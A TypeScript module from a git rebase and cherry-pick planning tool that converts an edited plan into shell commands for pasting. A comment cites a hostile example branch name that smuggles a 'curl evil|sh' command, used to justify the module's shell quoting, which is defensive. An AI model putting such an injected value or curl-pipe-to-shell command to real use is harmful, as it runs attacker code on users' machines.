// a rebase or cherry-pick plan, edited in the browser and pasted into a
// terminal: the rows carry an action each and can be reordered; `paste`
// flattens them to the git commands, hands-free (the todo and any drafted
// messages travel as heredocs, so no editor opens). nothing here runs git
// or talks to github; the user's shell does the work.
import type { Block, PlanAction, PlanRow } from "./block";

export type PlanBlock = Extract<Block, { kind: "plan" }>;

// the actions that fold a commit into the one before it in the todo
const FOLD = new Set<PlanAction>(["squash", "fixup"]);
export const isFold = (a: PlanAction) => FOLD.has(a);

export const REBASE_ACTIONS: PlanAction[] = ["pick", "reword", "squash", "fixup", "drop", "edit"];
export const PICK_ACTIONS: PlanAction[] = ["pick", "drop"];

// the message a row carries: the edited text, else the commit's own
export const messageOf = (r: PlanRow): string => (r.text ?? r.message).trim();

// the target a plan lands on, for people
export function targetName(b: PlanBlock): string {
  return b.onto ?? b.base.ref ?? b.base.sha.slice(0, 7);
}

// single-quote a value for a POSIX shell: git allows shell metacharacters
// in branch names (a repo could hold a branch named `x;curl evil|sh`), and
// the paste block is run in the user's terminal, so every ref we emit is
// quoted, embedded quotes escaped, so it can never break out of its argument
export function shq(s: string): string {
  return `'${s.replace(/'/g, "'\\''")}'`;
}

// a heredoc delimiter that appears in none of the texts as a whole line
export function delimiter(texts: string[]): string {
  const lines = new Set(texts.flatMap((t) => t.split("\n").map((l) => l.trim())));
  let d = "EOF";
  for (let n = 1; lines.has(d); n++) d = `EOF${n}`;
  return d;
}

const files = (b: PlanBlock) => `/tmp/wd-${b.base.sha.slice(0, 7)}`;

// rows in todo order: oldest first
const todoOrder = (rows: PlanRow[]): PlanRow[] => [...rows].reverse();

// the todo lines, oldest first, and the drafted messages they refer to
// (one file per group whose target carries a text). folds attach to the
// nearest older row that is neither a fold nor a drop, drops in between
// are kept in place; a fold with nothing before it is kept as a pick
function todo(b: PlanBlock): { lines: string[]; texts: string[]; warnings: string[] } {
  const lines: string[] = [];
  const texts: string[] = [];
  const warnings: string[] = [];
  const dir = files(b);
  const line = (verb: string, r: PlanRow) => `${verb} ${r.sha.slice(0, 7)} ${r.subject}`;
  let group: { target: PlanRow; body: string[] } | null = null;
  const flush = () => {
    if (!group) return;
    const t = group.target;
    const text = t.text?.trim();
    const verb = t.action === "reword" && !text ? "reword" : t.action === "edit" ? "edit" : "pick";
    lines.push(line(verb, t), ...group.body);
    if (text) {
      texts.push(text);
      lines.push(`exec git commit --amend -F ${dir}-msg-${texts.length}`);
    }
    group = null;
  };
  for (const r of todoOrder(b.rows)) {
    if (r.action === "drop") {
      if (group) group.body.push(line("drop", r));
      else lines.push(line("drop", r));
      continue;
    }
    if (isFold(r.action)) {
      if (!group) {
        warnings.push(`row ${b.rows.indexOf(r) + 1} has nothing to ${r.action} into; kept as pick`);
        group = { target: { ...r, action: "pick" }, body: [] };
        continue;
      }
      group.body.push(line(group.target.text?.trim() ? "fixup" : r.action, r));
      continue;
    }
    flush();
    group = { target: r, body: [] };
  }
  flush();
  return { lines, texts, warnings };
}

// what to say above the paste block, if anything
export function warnings(b: PlanBlock): string[] {
  if (b.mode === "pick") {
    return b.rows.some((r) => r.action !== "drop") ? [] : ["every row is dropped; nothing to pick"];
  }
  return todo(b).warnings;
}

// the commands to paste, in order
export function paste(b: PlanBlock): string[] {
  const out: string[] = [];
  if (b.mode === "pick") {
    const shas = todoOrder(b.rows)
      .filter((r) => r.action !== "drop")
      .map((r) => r.sha);
    if (!shas.length) return out;
    out.push(`git switch ${shq(b.onto ?? "")}`, `git cherry-pick -x ${shas.join(" ")}`);
    return out;
  }
  const t = todo(b);
  const dir = files(b);
  const eof = delimiter([...t.texts, ...t.lines]);
  if (b.head) out.push(`git switch ${shq(b.head)}`);
  else out.push("# check out the branch that holds these commits first");
  t.texts.forEach((text, i) => {
    out.push(`cat > ${dir}-msg-${i + 1} <<'${eof}'`, text, eof);
  });
  out.push(`cat > ${dir}-todo <<'${eof}'`, ...t.lines, eof);
  out.push(`GIT_SEQUENCE_EDITOR='cp ${dir}-todo' git rebase -i ${b.base.sha}`);
  return out;
}

// editing

export function move(rows: PlanRow[], from: number, to: number): PlanRow[] {
  if (from === to || from < 0 || to < 0 || from >= rows.length || to >= rows.length) return rows;
  const next = [...rows];
  const [r] = next.splice(from, 1);
  next.splice(to, 0, r);
  return next;
}

// pick forgets an edited text; drop and the rest keep it
export function setAction(rows: PlanRow[], i: number, action: PlanAction): PlanRow[] {
  return rows.map((r, j) => {
    if (j !== i) return r;
    const next: PlanRow = { ...r, action };
    if (action === "pick") delete next.text;
    return next;
  });
}

// a changed message makes a pick a reword; the original message makes a
// reword a pick again
export function setText(rows: PlanRow[], i: number, text: string): PlanRow[] {
  return rows.map((r, j) => {
    if (j !== i) return r;
    const same = text.trim() === r.message.trim();
    const next: PlanRow = { ...r };
    if (same) delete next.text;
    else next.text = text;
    if (!same && r.action === "pick") next.action = "reword";
    if (same && r.action === "reword") next.action = "pick";
    return next;
  });
}

// a row dropped into the plan at a display position, given a fresh idx
// (past every existing one, so it counts as moved wherever it lands);
// a sha already in the plan leaves the rows alone
export function insertRow(rows: PlanRow[], row: PlanRow, at: number): PlanRow[] {
  if (rows.some((r) => r.sha === row.sha)) return rows;
  const idx = rows.reduce((m, r) => Math.max(m, r.idx), -1) + 1;
  const i = Math.max(0, Math.min(at, rows.length));
  const next: PlanRow = { ...row, idx, action: "pick" };
  delete next.text;
  return [...rows.slice(0, i), next, ...rows.slice(i)];
}

// whether reset would change anything: a row out of its original place,
// a non-pick action, or an edited message. an appended drag-in that is
// still a pick in its slot leaves nothing for reset to restore
export function isEdited(rows: PlanRow[]): boolean {
  return rows.some((r, i) => r.idx !== i || r.action !== "pick" || r.text !== undefined);
}

export function reset(rows: PlanRow[]): PlanRow[] {
  return [...rows]
    .sort((a, b) => a.idx - b.idx)
    .map((r) => {
      const next: PlanRow = { ...r, action: "pick" };
      delete next.text;
      return next;
    });
}

// the row and the rows folding into it (the folds above it, drops in
// between skipped), oldest first: what a drafted message should read
export function draftShas(rows: PlanRow[], i: number): string[] {
  const out = [rows[i].sha];
  for (let j = i - 1; j >= 0; j--) {
    const a = rows[j].action;
    if (a === "drop") continue;
    if (!isFold(a)) break;
    out.push(rows[j].sha);
  }
  return out;
}

// the row a fold lands in, by display index, or null when nothing older
// can take it
export function foldTarget(rows: PlanRow[], i: number): number | null {
  for (let j = i + 1; j < rows.length; j++) {
    const a = rows[j].action;
    if (a === "drop" || isFold(a)) continue;
    return j;
  }
  return null;
}

// rows that moved past another row touching the same file: applying them
// in the new order changes what each patch lands on. keyed by display
// index, one note per row
export function reorderClashes(rows: PlanRow[]): Map<number, string> {
  const out = new Map<number, string>();
  for (let i = 0; i < rows.length; i++) {
    if (rows[i].action === "drop") continue;
    for (let j = i + 1; j < rows.length; j++) {
      if (rows[j].action === "drop") continue;
      if (rows[i].idx < rows[j].idx) continue; // still in the original order
      const shared = rows[i].files.find((f) => rows[j].files.includes(f));
      if (!shared) continue;
      if (!out.has(i)) out.set(i, `reordered past row ${j + 1} (${shared})`);
      if (!out.has(j)) out.set(j, `reordered past row ${i + 1} (${shared})`);
    }
  }
  return out;
}

// one line under the paste block: whether the plan is likely to apply
// cleanly, judging from file overlap only
export function verdict(b: PlanBlock): { text: string; warn: boolean } {
  const moved = reorderClashes(b.rows);
  const n = b.rows.filter((r, i) => r.action !== "drop" && (r.clash.length || moved.has(i))).length;
  if (!n) return { text: "likely clean (no file overlap with the target)", warn: false };
  const where = b.mode === "pick" ? `on ${targetName(b)}` : `on ${targetName(b)} since the base`;
  return {
    text: `${n} ${n === 1 ? "row touches" : "rows touch"} files also changed ${where}; expect conflicts`,
    warn: true,
  };
}

// a drafted message, from the model's `subject` and `body` sections
export function parseMessage(answer: string): { subject: string; body: string } {
  const lines = answer.split("\n").map((l) => l.trimEnd());
  const s = lines.findIndex((l) => l.trim() === "subject");
  const b = lines.findIndex((l) => l.trim() === "body");
  const subjectLines = s < 0 ? lines : lines.slice(s + 1, b > s ? b : undefined);
  const subject = (subjectLines.find((l) => l.trim()) ?? "").trim().replace(/\.$/, "");
  const body = (b >= 0 ? lines.slice(b + 1) : []).join("\n").trim();
  return { subject, body };
}

export const messageText = (m: { subject: string; body: string }): string =>
  m.body ? `${m.subject}\n\n${m.body}` : m.subject;
